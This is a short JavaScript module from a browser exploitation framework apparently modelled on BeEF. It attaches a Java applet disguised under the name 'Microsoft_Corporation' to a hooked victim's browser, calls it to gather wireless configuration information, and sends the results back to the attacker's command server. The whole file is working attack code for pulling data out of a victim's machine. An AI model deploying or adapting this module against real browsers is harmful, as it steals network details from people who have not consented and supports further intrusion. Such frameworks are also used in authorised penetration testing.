/*
 * Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (Server) - https://serverproject.com
 * See the file 'doc/COPYING' for copying permission
 */

server.execute(function() {
    var applet_archive = server.net.httpproto + '://'+server.net.host+ ':' + server.net.port + '/wirelessZeroConfig.jar';
    var applet_id = '<%= @applet_id %>';
    var applet_name = '<%= @applet_name %>';
    var output;
    server.dom.attachApplet(applet_id, 'Microsoft_Corporation', 'wirelessZeroConfig' ,
       	null, applet_archive, null);
    output = document.Microsoft_Corporation.getInfo();
    if (output) {
	server.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+output);
    }
    server.dom.detachApplet('wirelessZeroConfig');
});


